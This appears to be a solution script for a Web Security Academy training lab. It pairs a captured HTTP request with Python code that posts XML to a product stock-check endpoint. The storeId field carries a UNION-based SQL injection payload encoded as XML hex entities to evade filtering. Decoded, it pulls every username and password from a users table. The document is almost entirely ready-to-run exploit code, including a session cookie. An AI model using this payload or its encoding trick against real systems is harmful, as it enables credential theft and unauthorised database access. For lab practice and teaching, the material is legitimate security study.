'''
POST /product/stock HTTP/2
Host: 0a0b007a03ca893782d22f9200a1000c.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0b007a03ca893782d22f9200a1000c.web-security-academy.net/product?productId=2
Content-Type: application/xml
Content-Length: 107
Origin: https://0a0b007a03ca893782d22f9200a1000c.web-security-academy.net
Connection: keep-alive
Cookie: session=jGtlL5XFYPgVYC4GqL1tBNAzXME9OxwS
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
TE: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
'''

import requests


DOMAIN = "0a0b007a03ca893782d22f9200a1000c.web-security-academy.net"
url = f"https://{DOMAIN}/product/stock"

headers = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"https://{DOMAIN}/product?productId=2",
    "Content-Type": "application/xml",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Cookie": "session=jGtlL5XFYPgVYC4GqL1tBNAzXME9OxwS",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers"
}

data = """<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x66;&#x72;&#x6f;&#x6d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId></stockCheck>"""

response = requests.post(url, headers=headers, data=data)

print(response.text)